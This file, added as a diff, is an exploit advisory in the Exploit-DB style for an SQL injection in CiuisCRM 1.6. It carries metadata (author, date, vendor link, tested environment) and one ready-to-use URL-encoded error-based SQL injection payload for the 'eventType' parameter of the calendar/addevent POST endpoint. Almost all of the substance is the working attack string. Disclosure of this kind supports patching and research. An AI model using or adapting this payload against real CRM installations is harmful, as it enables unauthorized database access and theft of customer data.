@@ -1,0 +1,19 @@
+﻿===========================================================================================
+# Exploit Title: CiuisCRM 1.6 - 'eventType' SQL Inj.
+# Dork: N/A
+# Date: 27-05-2019
+# Exploit Author: Mehmet EMİROĞLU
+# Vendor Homepage: https://codecanyon.net/item/ciuis-crm/20473489
+# Software Link: https://codecanyon.net/item/ciuis-crm/20473489
+# Version: v1.6
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: Ciuis CRM you can easily manage your customer relationships and save time on your business.
+===========================================================================================
+# POC - SQLi
+# Parameters : eventType
+# Attack Pattern :
+-1+or+1%3d1+and(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)
+# POST Method : http://localhost/ciuiscrm-16/calendar/addevent
+===========================================================================================
